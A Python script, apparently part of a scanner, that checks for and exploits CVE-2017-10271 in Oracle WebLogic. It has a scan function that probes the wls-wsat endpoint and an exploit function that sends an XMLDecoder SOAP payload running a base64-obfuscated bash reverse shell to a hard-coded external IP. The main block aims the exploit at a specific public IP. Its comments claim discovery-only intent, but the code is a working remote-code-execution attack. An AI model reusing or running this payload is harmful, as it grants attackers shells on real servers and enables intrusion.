# coding:utf-8

import requests
import sys,os
sys.path.append(os.path.abspath(os.path.dirname(os.path.abspath(__file__))+os.path.sep+".."))
from core.common import *
import base64


def cve_2017_10271_scan(url):
    """
    接受一个url参数  
    返回true/false
    """
    # reach_info = url_life(gen_domain_url(url))
    # if reach_info["vuln"] == "true":
    #     pass
    # elif reach_info["vuln"] == "unreach" or reach_info["vuln"] == "except":
    #     return reach_info  

    url = gen_domain_url(url) + "/wls-wsat/CoordinatorPortType"
    req = requests.get(url)

    if "Endpoint" in req.text :
        # print url + " is vuln"
        return return_line(vuln="True",info=url)
    else :
        return return_line(vuln="False",info=url)


def cve_2017_10271_exploit(url):
    """
    接受url参数
    这个函数并不打算对外开放，因为对于没有回显的命令执行或代码执行，其实往往更多是通过DNS带外通信，或是反弹shell亦或是写马  
    而这一步定制型还蛮高的，我也懒得研究DNS平台的api  
    而该工具目前只打算用于漏洞发现，当然了像msf那样接受用户提供的lhost和lport完全可以实现  
    对于我而言就是几个字符串拼接的事情，很简单，但我并不打算这样，就这么简单  
    没什么好返回的  
    """
    payload = "echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTY1LjIxOS84ODg4IDA+JjE=\"|base64 -d|bash"
    # payload = base64.b64encode(payload.encode("utf-8"))
    # payload = "echo \"" + payload + "\"|base64 -d|bash"
    # print payload

    payload_xml = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.4.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>/bin/bash</string>
        </void>
        <void index="1">
        <string>-c</string>
        </void>
        <void index="2">
        <string>%s</string>
        </void>
        </array>
        <void method="start"/></void>
        </java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
    """ % (payload)
    url = gen_domain_url(url) + "/wls-wsat/CoordinatorPortType"
    headers = {"Content-Type":"text/xml"}
    req = requests.post(url,data=payload_xml,headers=headers)

if __name__ == "__main__":
    print cve_2017_10271_exploit("http://91.217.230.107/wls-wsat/CoordinatorPortType")